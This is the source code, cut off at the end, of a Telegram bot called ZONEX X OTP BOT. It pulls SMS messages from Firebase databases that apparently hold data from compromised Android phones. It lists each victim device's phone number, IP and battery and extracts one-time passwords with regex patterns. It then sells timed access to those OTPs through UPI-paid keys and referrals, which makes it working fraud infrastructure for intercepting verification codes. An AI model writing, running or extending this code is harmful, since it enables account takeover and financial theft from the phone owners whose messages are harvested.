#!/usr/bin/env python3
"""
╔══════════════════════════════════════════╗
║        ZONEX X OTP BOT v4.6              ║
║  Channel Gate · Key Entry · Time Plans   ║
║  Referral · Multi-Firebase · Admin Panel ║
╚══════════════════════════════════════════╝
"""

import os, re, json, logging, string, random, asyncio
from datetime import datetime, timedelta, timezone
from typing import Optional
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatMember
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    ContextTypes, MessageHandler, filters, ConversationHandler
)
from telegram.error import TelegramError

# ─── Config ───────────────────────────────────────────────────────────────────
BOT_TOKEN      = os.getenv("BOT_TOKEN", "")
_admin_ids_setting = (
    os.getenv("ADMIN_IDS")
    or os.getenv("ADMIN_ID")
    or os.getenv("ADMIN")
    or "8917259924"
)
ADMIN_IDS      = [int(x.strip()) for x in _admin_ids_setting.split(",") if x.strip()]
ADMIN_USERNAME = "@AG14447"
BOT_DEV        = "@zonexarmy"
DATA_FILE      = "bot/data.json"
AUTO_REFRESH   = 10

# ─── Firebase Configuration (UPDATED with your config) ─────────────────────
FIREBASE_CONFIG = {
    "apiKey": os.getenv("FIREBASE_API_KEY", ""),
    "authDomain": "era-ka-store.firebaseapp.com",
    "projectId": "era-ka-store",
    "storageBucket": "era-ka-store.firebasestorage.app",
    "messagingSenderId": "540743058625",
    "appId": "1:540743058625:web:d0938c9cfa3e4750e48040",
    "measurementId": "G-QZGN0SFYHC",
    "databaseURL": "https://era-ka-store-default-rtdb.firebaseio.com"  # Added for RTDB
}

# Use API Key from config
GAPI_KEY = FIREBASE_CONFIG["apiKey"]
FS_PROJECT = FIREBASE_CONFIG["projectId"]
FS_RTDB_URL = f"https://{FS_PROJECT}-default-rtdb.firebaseio.com/bot_data.json"

DEVICES_PER_PAGE = 6
WELCOME_HOURS  = 1

CHANNELS = ["zonexarmy", "SMARTEARNERS011"]   # force-join channels (without @)
CH_NAMES = {
    "zonexarmy": "𝐙𝐎𝐍𝐄𝐗 𝐀𝐫𝐞𝐚 💸💸",
    "SMARTEARNERS011": "SMART EARNERS",
}

# ─── Conversation states ──────────────────────────────────────────────────────
WAIT_KEY        = 10
WAIT_FB_URL     = 20
WAIT_FB_LABEL   = 21
WAIT_BROADCAST  = 30
WAIT_PLAN_TIME  = 40
WAIT_PLAN_PRICE = 41
WAIT_ADD_TIME   = 50

logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s",
                    level=logging.INFO, datefmt="%Y-%m-%d %H:%M:%S")
logger = logging.getLogger(__name__)

# ─── Refresh lock ────────────────────────────────────────────────────────────
_refresh_lock: asyncio.Lock = None

# ─── Key generator ────────────────────────────────────────────────────────────
def _gen_key_raw(length=10) -> str:
    return "ZONEX-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=length))

# ─── Persistent Storage ───────────────────────────────────────────────────────
def _default_data() -> dict:
    return {
        "users": {},
        "firebase_configs": [
            {"url": "https://paisa-8e4f4-default-rtdb.firebaseio.com",
             "label": "Main DB", "key": ""}
        ],
        "pricing_plans": [
            {"id": "p1", "hours": 24,  "price": 30,  "label": "1 Din (24h)"},
            {"id": "p2", "hours": 168, "price": 100, "label": "7 Din (168h)"},
            {"id": "p3", "hours": 720, "price": 500, "label": "30 Din (720h)"},
        ],
        "referral_hours": 1,
        "upi_id": "",
        "qr_file_id": "",
        "pending_payments": {},
        "maintenance": False,
    }

def load_data() -> dict:
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE) as f:
                d = json.load(f)
            d.pop("activation_codes", None)
            for uid, u in d.get("users", {}).items():
                u.setdefault("key",            _gen_key_raw())
                u.setdefault("expires_at",     None)
                u.setdefault("referred_by",    None)
                u.setdefault("referral_count", 0)
                u.setdefault("channels_done",  False)
                u.setdefault("key_verified",   False)
                u.setdefault("banned",         False)
            d.setdefault("pricing_plans", _default_data()["pricing_plans"])
            d.setdefault("referral_hours", 1)
            d.setdefault("upi_id", "")
            d.setdefault("qr_file_id", "")
            d.setdefault("pending_payments", {})
            d.setdefault("maintenance", False)
            return d
    except Exception as e:
        logger.error(f"load_data: {e}")
    return _default_data()

def save_data(d: dict):
    os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)
    with open(DATA_FILE, "w") as f:
        json.dump(d, f, indent=2)
    # Push to Firebase Realtime Database
    try:
        loop = asyncio.get_running_loop()
        loop.create_task(_push_firestore(d))
    except RuntimeError:
        pass  # No running loop yet

async def _push_firestore(d: dict):
    """Push bot data to Firebase Realtime Database with your API key."""
    if not GAPI_KEY:
        logger.warning("⚠️ GAPI_KEY not set! Data not saved to Firebase.")
        return
    
    try:
        payload = json.dumps(d, separators=(",", ":"))
        # Use your actual Firebase API key for authentication
        url = f"{FS_RTDB_URL}?auth={GAPI_KEY}"
        
        async with _get_session().put(url, data=payload,
                         headers={"Content-Type": "application/json"}) as r:
            if r.status in (200, 201):
                logger.info("✅ Firebase RTDB save successful")
            else:
                body = await r.text()
                logger.warning(f"❌ Firebase RTDB save failed: {r.status} - {body[:200]}")
    except Exception as e:
        logger.warning(f"❌ Firebase RTDB push error: {e}")

async def _load_firestore() -> bool:
    """Load bot data from Firebase Realtime Database on startup."""
    if not GAPI_KEY:
        logger.warning("⚠️ GAPI_KEY not set! Using local data only.")
        return False
    
    try:
        url = f"{FS_RTDB_URL}?auth={GAPI_KEY}"
        async with _get_session().get(url) as r:
            if r.status == 200:
                d = await r.json()
                if not isinstance(d, dict):
                    return False
                
                # Apply migrations
                d.pop("activation_codes", None)
                for uid, u in d.get("users", {}).items():
                    u.setdefault("key",            _gen_key_raw())
                    u.setdefault("expires_at",     None)
                    u.setdefault("referred_by",    None)
                    u.setdefault("referral_count", 0)
                    u.setdefault("channels_done",  False)
                    u.setdefault("key_verified",   False)
                    u.setdefault("banned",         False)
                d.setdefault("pricing_plans",    _default_data()["pricing_plans"])
                d.setdefault("referral_hours",   1)
                d.setdefault("upi_id",           "")
                d.setdefault("qr_file_id",       "")
                d.setdefault("pending_payments", {})
                d.setdefault("maintenance",      False)
                
                global data
                data = d
                
                # Write local backup
                os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)
                with open(DATA_FILE, "w") as f:
                    json.dump(d, f, indent=2)
                
                logger.info(f"✅ Firebase RTDB load OK — {len(d.get('users',{}))} users")
                return True
            elif r.status == 401:
                logger.error(f"❌ Firebase auth failed! Check API key: {GAPI_KEY[:10]}...")
            elif r.status == 404:
                logger.info("ℹ️ Firebase: No cloud data yet, will create on first save")
            else:
                body = await r.text()
                logger.warning(f"Firebase load: {r.status} - {body[:120]}")
    except Exception as e:
        logger.warning(f"Firebase load error: {e}")
    return False

# Load data (will try Firebase first, then fallback to local)
data = load_data()

# Try to load from Firebase on startup (async, will be called in _on_startup)
async def _sync_from_firebase_on_startup():
    """Try to load from Firebase on startup"""
    loaded = await _load_firestore()
    if not loaded:
        logger.info("⚠️ Using local data.json (Firebase not available or empty)")
    else:
        logger.info("✅ Using Firebase data")

# ─── Helper functions ─────────────────────────────────────────────────────────
def get_referral_hours() -> float:
    return float(data.get("referral_hours", 1))

# ─── Cache ────────────────────────────────────────────────────────────────────
device_cache: dict   = {}
otp_cache:    dict   = {}
last_refresh         = "Never"
fb_last_sync: dict   = {}   # label -> "HH:MM:SS" when last synced
fb_conn_status: dict = {}   # label -> "ok" | "error" | "timeout" | "auth"

# ─── Global HTTP session ─────────────────────────────────────────────────────
_http_session: Optional[aiohttp.ClientSession] = None

def _get_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(
            limit=30,
            ttl_dns_cache=300,
            enable_cleanup_closed=True,
        )
        _http_session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=6),
        )
    return _http_session

# ─── Time helpers ─────────────────────────────────────────────────────────────
IST = timezone(timedelta(hours=5, minutes=30))

def now_dt() -> datetime:
    return datetime.now(IST).replace(tzinfo=None)

def now_str() -> str:
    return now_dt().strftime("%Y-%m-%d %H:%M:%S")

def expires_dt(uid: int) -> Optional[datetime]:
    s = data["users"].get(str(uid), {}).get("expires_at")
    if not s: return None
    try: return datetime.strptime(s, "%Y-%m-%d %H:%M:%S")
    except: return None

def time_left_str(uid: int) -> str:
    if is_admin(uid): return "∞ Unlimited"
    exp = expires_dt(uid)
    if not exp: return "❌ No Access"
    diff = exp - now_dt()
    if diff.total_seconds() <= 0: return "⏰ Expired"
    h = int(diff.total_seconds() // 3600)
    m = int((diff.total_seconds() % 3600) // 60)
    if h >= 24:
        return f"✅ {h//24}d {h%24}h {m}m"
    return f"✅ {h}h {m}m"

def time_left_detailed(uid: int) -> str:
    if is_admin(uid): return "∞ Unlimited"
    exp = expires_dt(uid)
    if not exp: return "❌ No Access"
    diff = exp - now_dt()
    if diff.total_seconds() <= 0:
        return f"⏰ Expired ({exp.strftime('%d/%m %H:%M')})"
    h = int(diff.total_seconds() // 3600)
    m = int((diff.total_seconds() % 3600) // 60)
    exp_str = exp.strftime('%d/%m/%Y %H:%M')
    if h >= 24:
        return f"✅ {h//24}d {h%24}h {m}m left\n   📅 Expires: {exp_str}"
    return f"✅ {h}h {m}m left\n   📅 Expires: {exp_str}"

def add_hours(uid: int, hours: float):
    exp = expires_dt(uid)
    base = now_dt() if (not exp or exp < now_dt()) else exp
    new_exp = base + timedelta(hours=hours)
    if new_exp < now_dt() and hours < 0:
        new_exp = now_dt() - timedelta(seconds=1)
    data["users"][str(uid)]["expires_at"] = new_exp.strftime("%Y-%m-%d %H:%M:%S")
    save_data(data)

def set_expiry(uid: int, dt: datetime):
    data["users"][str(uid)]["expires_at"] = dt.strftime("%Y-%m-%d %H:%M:%S")
    save_data(data)

# ─── User helpers ─────────────────────────────────────────────────────────────
def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS

def is_banned(uid: int) -> bool:
    return bool(data["users"].get(str(uid), {}).get("banned", False))

def has_access(uid: int) -> bool:
    if is_admin(uid): return True
    if is_banned(uid): return False
    exp = expires_dt(uid)
    return bool(exp and exp > now_dt())

def ensure_user(uid: int, username: str, name: str, referred_by: Optional[int] = None) -> dict:
    uid_s = str(uid)
    if uid_s not in data["users"]:
        key = _gen_key_raw()
        while any(u.get("key") == key for u in data["users"].values()):
            key = _gen_key_raw()
        data["users"][uid_s] = {
            "username": username or "", "name": name or "",
            "joined": now_str(), "key": key,
            "expires_at": None, "referred_by": referred_by,
            "referral_count": 0, "channels_done": False,
            "key_verified": False, "banned": False,
        }
        save_data(data)
    return data["users"][uid_s]

def get_key(uid: int) -> str:
    return data["users"].get(str(uid), {}).get("key", "—")

# ─── Channel helpers ──────────────────────────────────────────────────────────
async def check_channels(bot, uid: int) -> tuple[bool, list[str]]:
    missing = []
    for ch in CHANNELS:
        try:
            m = await bot.get_chat_member(f"@{ch}", uid)
            if m.status in (ChatMember.LEFT, ChatMember.BANNED):
                missing.append(ch)
        except TelegramError:
            pass
    return len(missing) == 0, missing

def kb_channels(missing: list[str]) -> InlineKeyboardMarkup:
    rows = []
    for ch in missing:
        rows.append([InlineKeyboardButton(CH_NAMES.get(ch, f"@{ch}"), url=f"https://t.me/{ch}")])
    rows.append([InlineKeyboardButton("✅ Continue Verify", callback_data="check_join")])
    return InlineKeyboardMarkup(rows)

# ─── OTP helpers ──────────────────────────────────────────────────────────────
def extract_otp(text: str) -> Optional[str]:
    pats = [
        r'(?:OTP|One[\s\-]?Time[\s\-]?Password)\s*(?:is|:|\s)\s*(\d{4,8})',
        r'(\d{4,8})\s+(?:is\s+)?(?:your|the)\s+(?:OTP|One[\s\-]?Time)',
        r'(?:verification\s+code|verify\s+code|auth\s+code|login\s+code)\s*[:\-]?\s*(\d{4,8})',
        r'(?:code|passcode|security\s+code|access\s+code)\s*[:\-]\s*(\d{4,8})',
        r'(?:your|the)\s+(?:OTP|code|PIN|passcode)\s+(?:is\s+)?(\d{4,8})',
        r'(?:PIN|pin)\s*[:\-]\s*(\d{4,8})',
        r'\b(\d{6})\s+(?:is\s+)?(?:your|the|this)\b',
        r'(?:is|:)\s+(\d{6})\b',
        r'(?:is|:)\s+(\d{4})\b',
        r'(?:is|:)\s+(\d{8})\b',
        r'(?:is|:)\s+(\d{5})\b',
        r'(?:use|enter|share)\s+(?:this\s+)?(?:OTP|code)\s*[:\-]?\s*(\d{4,8})',
        r'(?:do not|dont|never)\s+share.*?(\d{6})',
        r'(?:do not|dont|never)\s+share.*?(\d{4})',
        r'(?:do not|dont|never)\s+share.*?(\d{8})',
        r'valid\s+for.*?(\d{6})',
        r'expires?\s+in.*?(\d{6})',
        r'\b(\d{6})\b',
        r'\b(\d{8})\b',
        r'\b(\d{5})\b',
        r'\b(\d{4})\b',
    ]
    skip = {
        '2023','2024','2025','2026','2027','2028','2029','2030',
        '1234','0000','1111','2222','3333','4444','5555','6666','7777','8888','9999',
        '12345','123456','000000','111111',
    }
    for p in pats:
        m = re.search(p, text, re.IGNORECASE)
        if m and m.group(1) not in skip:
            return m.group(1)
    return None

def _parse_ts_dt(ts) -> Optional[datetime]:
    try:
        if isinstance(ts, (int, float)):
            t = int(ts)
            if t < 1e12: t *= 1000
            return datetime.utcfromtimestamp(t / 1000) + timedelta(hours=5, minutes=30)
        if isinstance(ts, str) and ts.strip():
            clean = ts.replace(" | ", " ").replace("|", " ").strip()
            for fmt in ("%Y-%m-%dT%H:%M:%S", "%d/%m/%Y %H:%M:%S",
                        "%d-%m-%Y %H:%M:%S", "%d/%m/%Y, %H:%M:%S",
                        "%d-%m-%Y %H:%M", "%d/%m/%Y %H:%M",
                        "%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M"):
                try: return datetime.strptime(clean[:19], fmt)
                except: pass
    except: pass
    return None

def fmt_ts(ts) -> str:
    try:
        if isinstance(ts, (int, float)):
            t = int(ts)
            if t < 1e12: t *= 1000
            return (datetime.utcfromtimestamp(t/1000) + timedelta(hours=5, minutes=30)).strftime("%d/%m/%Y %H:%M")
        if isinstance(ts, str) and ts.strip():
            clean = ts.replace(" | ", " ").replace("|", " ").strip()
            for fmt in ("%Y-%m-%dT%H:%M:%S", "%d/%m/%Y %H:%M:%S",
                        "%d-%m-%Y %H:%M:%S", "%d/%m/%Y, %H:%M:%S",
                        "%d-%m-%Y %H:%M", "%d/%m/%Y %H:%M",
                        "%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M"):
                try: return datetime.strptime(clean[:19], fmt).strftime("%d/%m/%Y %H:%M")
                except: pass
            return clean[:16]
    except: pass
    return "—"

# ─── Firebase ─────────────────────────────────────────────────────────────────
async def fb_get(url: str, path: str, key: str = "") -> Optional[dict]:
    base = url.rstrip("/")
    ep   = f"{base}/{path}.json" + (f"?auth={key}" if key else "")
    try:
        async with _get_session().get(ep) as r:
            return await r.json() if r.status == 200 else None
    except Exception as e:
        logger.warning(f"fb_get [{path}]: {e}")
    return None

async def fetch_otps(url: str, key: str, dev_id: str):
    raw = await fb_get(url, f"messages/{dev_id}", key)
    if raw is None:
        raw = await fb_get(url, f"clients/{dev_id}/messages", key)
    if not isinstance(raw, dict): return [], None

    otps: list  = []
    last_any_dt = None

    for msg in reversed(list(raw.values())[-50:]):
        if not isinstance(msg, dict): continue
        body   = str(msg.get("message") or msg.get("body") or msg.get("text") or "")
        sender = str(msg.get("sender") or msg.get("from") or msg.get("address") or "Unknown")
        ts     = msg.get("dateTime") or msg.get("date") or msg.get("timestamp") or ""
        msg_dt = _parse_ts_dt(ts)

        if msg_dt and (last_any_dt is None or msg_dt > last_any_dt):
            last_any_dt = msg_dt

        otp = extract_otp(body)
        if otp:
            otps.append({
                "otp": otp, "sender": sender,
                "time": fmt_ts(ts), "msg": body[:300],
                "_dt": msg_dt,
            })
    return otps, last_any_dt

async def refresh_firebase(cfg: dict):
    url, key, label = cfg["url"], cfg.get("key",""), cfg["label"]
    clients = await fb_get(url, "clients", key)
    if not isinstance(clients, dict): return

    today = now_dt().date()

    valid = []
    for dev_id, info in clients.items():
        if not isinstance(info, dict): continue
        sims = info.get("sims") or {}
        sl   = sims if isinstance(sims, list) else list(sims.values())
        def _pick(*vals):
            for v in vals:
                s = str(v).strip()
                if s and s not in ("None","none","","—","-","Unknown","unknown","null"):
                    return s
            return "—"
        sim_phone = sl[0].get("phoneNumber") or sl[0].get("phone") or sl[0].get("number","") if sl else ""
        phone = _pick(
            info.get("mobNo"), info.get("phoneNumber"), info.get("phone"),
            info.get("mobile"), info.get("Mobile"), info.get("phone_number"),
            info.get("PhoneNumber"), sim_phone,
        )
        valid.append((dev_id, info, phone))

    async def _fetch_one(dev_id):
        try:
            return await fetch_otps(url, key, dev_id)
        except Exception as e:
            logger.warning(f"fetch_otps [{dev_id}]: {e}")
            return [], None

    results = await asyncio.gather(*[_fetch_one(dev_id) for dev_id, _, _ in valid])

    devs, otps_map = {}, {}
    for (dev_id, info, phone), (raw_otps, _last_msg_dt) in zip(valid, results):
        phone_ok = _has_valid_phone({"phone": phone})
        fb_status = bool(info.get("status") or info.get("isOnline") or
                         info.get("is_online") or info.get("online"))
        is_online  = fb_status and phone_ok

        ts_raw = (info.get("lastSeen") or info.get("last_seen") or
                  info.get("lastOnline") or "")
        devs[dev_id] = {
            "online":    is_online,
            "phone":     phone,
            "name":      str(info.get("modelName") or info.get("model") or dev_id),
            "battery":   str(info.get("battery","—")),
            "android":   str(info.get("androidV") or info.get("androidVersion","—")),
            "network":   str(info.get("service_provider") or info.get("provider","—")),
            "ip":        str(info.get("ip_address","—")),
            "last_seen": fmt_ts(ts_raw),
        }
        otps_map[dev_id] = raw_otps[:10]

    device_cache[label]    = devs
    otp_cache[label]       = otps_map
    fb_last_sync[label]    = now_dt().strftime("%H:%M:%S")
    fb_conn_status[label]  = "ok"

async def refresh_clients_only(cfg: dict):
    url, key, label = cfg["url"], cfg.get("key", ""), cfg["label"]
    clients = await fb_get(url, "clients", key)
    if not isinstance(clients, dict):
        return
    devs = {}
    for dev_id, info in clients.items():
        if not isinstance(info, dict):
            continue
        sims = info.get("sims") or {}
        sl   = sims if isinstance(sims, list) else list(sims.values())
        def _pick(*vals):
            for v in vals:
                s = str(v).strip()
                if s and s not in ("None", "none", "", "—", "-", "Unknown", "unknown", "null"):
                    return s
            return "—"
        sim_phone = (sl[0].get("phoneNumber") or sl[0].get("phone") or sl[0].get("number", "")) if sl else ""
        phone = _pick(
            info.get("mobNo"), info.get("phoneNumber"), info.get("phone"),
            info.get("mobile"), info.get("Mobile"), info.get("phone_number"),
            info.get("PhoneNumber"), sim_phone,
        )
        phone_ok  = _has_valid_phone({"phone": phone})
        fb_status = bool(info.get("status") or info.get("isOnline") or
                         info.get("is_online") or info.get("online"))
        is_online = fb_status and phone_ok
        ts_raw    = (info.get("lastSeen") or info.get("last_seen") or
                     info.get("lastOnline") or "")
        devs[dev_id] = {
            "online":    is_online,
            "phone":     phone,
            "name":      str(info.get("modelName") or info.get("model") or dev_id),
            "battery":   str(info.get("battery", "—")),
            "android":   str(info.get("androidV") or info.get("androidVersion", "—")),
            "network":   str(info.get("service_provider") or info.get("provider", "—")),
            "ip":        str(info.get("ip_address", "—")),
            "last_seen": fmt_ts(ts_raw),
        }
    device_cache[label]   = devs
    fb_last_sync[label]   = now_dt().strftime("%H:%M:%S")
    if label not in fb_conn_status:
        fb_conn_status[label] = "ok"

async def refresh_all():
    global last_refresh, _refresh_lock
    if _refresh_lock is None:
        _refresh_lock = asyncio.Lock()
    if _refresh_lock.locked():
        async with _refresh_lock:
            return
    async with _refresh_lock:
        async def _safe(cfg):
            try:
                await refresh_firebase(cfg)
            except Exception as e:
                logger.error(f"Refresh [{cfg['label']}]: {e}")
                fb_conn_status[cfg["label"]] = "error"
        await asyncio.gather(*[_safe(cfg) for cfg in data["firebase_configs"]])
        last_refresh = now_dt().strftime("%H:%M:%S")
        logger.info(f"✅ Refresh done | {last_refresh}")

# ─── Stats ────────────────────────────────────────────────────────────────────
def _normalize_phone(ph: str) -> str:
    ph = str(ph).strip()
    digits = re.sub(r"[\s\-\.\(\)]", "", ph)
    pure = digits.lstrip("+")
    if not pure.isdigit():
        return ph
    if len(pure) == 10 and pure[0] in "6789":
        return f"+91{pure}"
    if len(pure) == 12 and pure.startswith("91"):
        return f"+{pure}"
    if digits.startswith("+"):
        return digits
    return f"+{pure}"

def _has_valid_phone(info: dict) -> bool:
    ph = str(info.get("phone", "")).strip()
    if not ph:
        return False
    low = ph.lower()
    bad_words = {"unknown", "none", "null", "n/a", "na", "no number",
                 "not available", "unavailable", "undefined", "invalid"}
    if low in bad_words or low in ("—", "-", "–", "—"):
        return False
    if low.endswith("new"):
        return False
    # Space nahi hona chahiye number mein
    if " " in ph:
        return False
    # Sirf digits aur ek leading '+' allowed hai
    stripped = ph.lstrip("+")
    # Letters ya special chars (o, nya, etc.) reject karo
    if not stripped.isdigit():
        return False
    digits_only = stripped
    if len(digits_only) < 6:
        return False
    return True

def count_online() -> int:
    return sum(1 for dm in device_cache.values()
               for d in dm.values()
               if d.get("online") and _has_valid_phone(d))

def count_total() -> int:
    return sum(len(dm) for dm in device_cache.values())

def count_otps() -> int:
    return sum(len(ol) for om in otp_cache.values() for ol in om.values())

def all_online() -> list:
    return [(lb, did, info)
            for lb, dm in device_cache.items()
            for did, info in dm.items()
            if info.get("online") and _has_valid_phone(info)]

def resolve_label(esc: str) -> str:
    for cfg in data["firebase_configs"]:
        if cfg["label"].replace(":","_") == esc or cfg["label"] == esc:
            return cfg["label"]
    return esc

# ─── Text builders ────────────────────────────────────────────────────────────
def txt_welcome_panel(name: str, uid: int) -> str:
    tl  = time_left_str(uid)
    on  = count_online()
    otp = count_otps()
    dbs = len(data['firebase_configs'])
    return (
        f"🤖 <b>ZONEX X OTP Bot</b>\n"
        f"{'━'*28}\n\n"
        f"👋 Hey, <b>{name}!</b>\n"
        f"⏱ Access  ›  <b>{tl}</b>\n\n"
        f"<b>📡 Live Status</b>\n"
        f"  ├ 🟢 Online   <code>{on}</code> device{'s' if on!=1 else ''}\n"
        f"  ├ 🔑 OTPs     <code>{otp}</code>\n"
        f"  └ 🔥 Firebase  <code>{dbs}</code> DB\n\n"
        f"<i>🕐 Last sync: {last_refresh}  ·  auto {AUTO_REFRESH}s</i>"
    )

def _val(v: str) -> bool:
    return bool(v) and v not in ("—", "-", "–", "None", "none", "null", "")

def txt_device_card(label: str, dev_id: str) -> str:
    info  = device_cache.get(label, {}).get(dev_id, {})
    otps  = otp_cache.get(label, {}).get(dev_id, [])
    phone = _normalize_phone(info.get('phone','—'))
    battery   = str(info.get('battery','—'))
    android   = str(info.get('android','—'))
    network   = str(info.get('network','—'))
    ip        = str(info.get('ip','—'))
    last_seen = str(info.get('last_seen','—'))

    header = (
        f"📱 <b><code>{phone}</code></b>  <i>(tap to copy)</i>\n"
        f"{'━'*28}\n"
        f"🔋 Battery  ›  <code>{battery}</code>\n"
        f"🤖 Android  ›  <code>{android}</code>\n"
        f"📡 Network  ›  <code>{network}</code>\n"
        f"🌐 IP       ›  <code>{ip}</code>\n"
        f"🕐 Last Seen›  <code>{last_seen}</code>\n"
        f"🔥 DB       ›  <code>{label}</code>\n\n"
        f"<b>🔑 Latest OTP</b>\n{'─'*28}"
    )

    lines = [header]
    if otps:
        e = otps[0]
        lines.append(
            f"\n  ⚡ <b><code>{e['otp']}</code></b>\n"
            f"  📤 <i>{e['sender']}</i>\n"
            f"  🕐 {e['time']}"
        )
    else:
        lines.append("\n  ❌ <i>Koi recent OTP nahi mila</i>")
    return "".join(lines)

def txt_otp_alert(label: str, dev_id: str, e: dict, info: dict) -> str:
    return (
        f"⚡ <b>OTP ALERT</b> ⚡\n"
        f"{'━'*30}\n\n"
        f"🔢  <b><code>{e['otp']}</code></b>\n\n"
        f"{'━'*30}\n"
        f"📞 <code>{_normalize_phone(info.get('phone','—'))}</code>\n"
        f"📤 {e['sender']}\n"
        f"🕐 {e['time']}\n"
        f"{'─'*30}\n"
        f"💬 <i>{e['msg'][:200]}{'…' if len(e['msg'])>200 else ''}</i>\n"
        f"{'━'*30}\n"
        f"🤖 <b>ZONEX X OTP Bot</b>  ·  {BOT_DEV}"
    )

def txt_user_panel(uid: int) -> str:
    u    = data["users"].get(str(uid), {})
    key  = u.get("key","—")
    refs = u.get("referral_count", 0)
    rh   = get_referral_hours()
    tl   = time_left_detailed(uid)
    return (
        f"🔑 <b>KEY SYSTEM</b>\n"
        f"{'━'*28}\n\n"
        f"🆔 User ID\n"
        f"   <code>{uid}</code>\n\n"
        f"⏱ Access Status\n"
        f"   <b>{tl}</b>\n\n"
        f"🗝 Permanent Key\n"
        f"   <code>{key}</code>\n\n"
        f"👥 Referrals  ›  <b>{refs}</b>  <i>(+{int(refs*rh)}h earned)</i>\n"
        f"{'─'*28}\n"
        f"<i>Key kabhi nahi badlegi — sirf tumhari hai 🔒</i>"
    )

def txt_plans() -> str:
    plans = data.get("pricing_plans",[])
    upi   = data.get("upi_id","")
    if not plans:
        return f"💰 Koi plan nahi hai abhi.\n👑 Contact: {ADMIN_USERNAME}"
    lines = ["💰 <b>Buy Key — Plans</b>\n","━"*28,"\n\n"]
    for p in plans:
        h = int(p['hours'])
        if h >= 720:
            dur = f"{h//720} Month"
        elif h >= 168:
            dur = f"{h//168} Week"
        elif h >= 24:
            dur = f"{h//24} Din"
        else:
            dur = f"{h}h"
        lines.append(f"📦 <b>{dur}</b>  —  ⏱{h}h  —  💵 <b>₹{p['price']}</b>\n")
    lines.append(f"\n{'─'*28}\n")
    if upi:
        lines.append(f"💳 <b>UPI ID:</b> <code>{upi}</code>\n\n")
    lines += [f"<i>Payment ke baad admin ko screenshot bhejo.</i>\n",
              f"👑 {ADMIN_USERNAME}"]
    return "".join(lines)

def txt_stats() -> str:
    active = sum(1 for s, u in data["users"].items() if has_access(int(s)))
    on     = count_online()
    tot    = count_total()
    otp    = count_otps()
    return (
        f"📊 <b>System Stats</b>\n"
        f"{'━'*28}\n\n"
        f"<b>Devices</b>\n"
        f"  ├ 🟢 Online    <code>{on}</code>\n"
        f"  └ 📱 Total     <code>{tot}</code>\n\n"
        f"<b>Data</b>\n"
        f"  ├ 🔑 OTPs      <code>{otp}</code>\n"
        f"  └ 🔥 Firebase  <code>{len(data['firebase_configs'])}</code> DB\n\n"
        f"<b>Users</b>\n"
        f"  ├ 👥 Total     <code>{len(data['users'])}</code>\n"
        f"  └ ✅ Active    <code>{active}</code>\n\n"
        f"<i>🕐 Last sync: {last_refresh}</i>"
    )

def txt_expired(name: str) -> str:
    rh = get_referral_hours()
    return (
        f"⏰ <b>Access Khatam!</b>\n"
        f"{'━'*28}\n\n"
        f"Arre <b>{name}</b>, tumhara time khatam ho gaya! 😔\n\n"
        f"<b>Wapas aane ke 2 tarike:</b>\n\n"
        f"💰 <b>Buy Key</b>\n"
        f"   Plan kharido, turant access milega\n\n"
        f"👥 <b>Refer & Earn</b>\n"
        f"   Ek dost = FREE <b>+{rh:.0f}h</b> access! Bilkul free!\n"
        f"{'─'*28}\n"
        f"<i>Refer link ke liye 👇 button dabao</i>"
    )

# ─── Keyboards ────────────────────────────────────────────────────────────────
def kb_main(uid: int) -> InlineKeyboardMarkup:
    rows = [
        [InlineKeyboardButton("📱 Online Devices", callback_data="online:0"),
         InlineKeyboardButton("📊 Statistics",     callback_data="stats")],
        [InlineKeyboardButton("🔑 KEY SYSTEM",       callback_data="user_panel"),
         InlineKeyboardButton("🔄 Refresh",        callback_data="refresh")],
    ]
    if is_admin(uid):
        rows.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin")])
    return InlineKeyboardMarkup(rows)

def kb_back(page: str = "main_menu") -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("🏠 Menu", callback_data=page),
        InlineKeyboardButton("🔄 Refresh", callback_data="refresh"),
    ]])

def kb_online(devices: list, page: int) -> InlineKeyboardMarkup:
    start = page * DEVICES_PER_PAGE
    chunk = devices[start:start+DEVICES_PER_PAGE]
    rows  = []
    for i in range(0, len(chunk), 2):
        row = []
        for lb, did, info in chunk[i:i+2]:
            cnt  = len(otp_cache.get(lb,{}).get(did,[]))
            ph   = _normalize_phone(info.get("phone","—"))
            ph_short = ph[-10:] if ph != "—" else "—"
            esc  = lb.replace(":","_")
            row.append(InlineKeyboardButton(f"🟢 {ph_short} [{cnt}🔑]",
                                            callback_data=f"dev:{esc}:{did}:{page}"))
        rows.append(row)
    nav, total = [], max(1,(len(devices)+DEVICES_PER_PAGE-1)//DEVICES_PER_PAGE)
    if page > 0:
        nav.append(InlineKeyboardButton("◀️", callback_data=f"online:{page-1}"))
    nav.append(InlineKeyboardButton(f"📄 {page+1}/{total}", callback_data=f"pgsel:{page}:{total}"))
    if start+DEVICES_PER_PAGE < len(devices):
        nav.append(InlineKeyboardButton("▶️", callback_data=f"online:{page+1}"))
    if nav: rows.append(nav)
    rows.append([InlineKeyboardButton("🏠 Menu", callback_data="main_menu"),
                 InlineKeyboardButton("🔄 Refresh", callback_data="refresh")])
    return InlineKeyboardMarkup(rows)

def kb_device(label: str, dev_id: str, page: int = 0) -> InlineKeyboardMarkup:
    esc = label.replace(":","_")
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ Check OTP",     callback_data=f"rfr:{esc}:{dev_id}:{page}"),
         InlineKeyboardButton("📩 All OTPs",     callback_data=f"allotp:{esc}:{dev_id}:{page}")],
        [InlineKeyboardButton("◀️ Back",         callback_data=f"online:{page}"),
         InlineKeyboardButton("🏠 Menu",         callback_data="main_menu")],
    ])

def kb_user_panel() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 My Key",       callback_data="my_key"),
